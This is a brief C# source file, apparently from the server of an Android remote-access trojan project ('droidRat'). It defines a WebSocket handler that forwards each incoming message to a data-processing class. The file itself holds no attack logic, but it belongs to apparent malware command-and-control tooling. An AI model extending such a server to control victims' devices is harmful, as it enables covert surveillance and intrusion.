using CSharp_droidRat_GUI_Server.Module.ProcessData.process_super;
using WebSocketSharp;
using WebSocketSharp.Server;

namespace CSharp_droidRat_GUI_Server.Module.webSocket
{
    
    public class WebSocket : WebSocketBehavior
    {

        private DataProcess _dataProcess;

        public WebSocket()
        {
            _dataProcess = new DataProcess();
        }
        protected override void OnMessage(MessageEventArgs e)
        {
            var data = e.Data;
            _dataProcess.ProcessString(e.Data);
        }
    }
}